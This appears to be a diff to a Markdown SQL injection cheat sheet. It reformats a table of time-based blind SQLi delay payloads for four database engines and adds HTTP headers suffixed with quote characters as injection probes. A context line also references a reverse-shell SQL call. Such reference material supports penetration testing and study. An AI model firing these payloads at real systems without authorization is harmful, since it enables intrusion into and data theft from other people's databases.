@@ -110,12 +110,12 @@ Executes a second query. Results aren't returned — primarily used for blind SQ
 
 Unconditional 10-second delay.
 
-| DB         | Payload                               |
-| ---------- | ------------------------------------- |
-| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
-| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
-| PostgreSQL | `SELECT pg_sleep(10)`                 |
-| MySQL      | SELECT SLEEP(10)                      |
+| DB         | Payload                             |
+| ---------- | ----------------------------------- |
+| Oracle     | dbms_pipe.receive_message(('a'),10) |
+| Microsoft  | WAITFOR DELAY '0:0:10'              |
+| PostgreSQL | \|\| SELECT pg_sleep(10)            |
+| MySQL      | SELECT SLEEP(10)                    |
 
 ---
 
@@ -253,3 +253,11 @@ SELECT rev_shell('127.0.0.1', 443);
 ## Defending Against SQL Injection
 
 Use `parameterized queries`!
+
+HEADERS MAY BE SUSCEPTIBLE TO SQLI 
+
+HOST: 127.0.0.1'
+X-Forwarded-For: 127.0.0.1'
+User-Agent: Mozilla/5.0'
+Referer: http://example.com'
+Cookie: session=abc123'
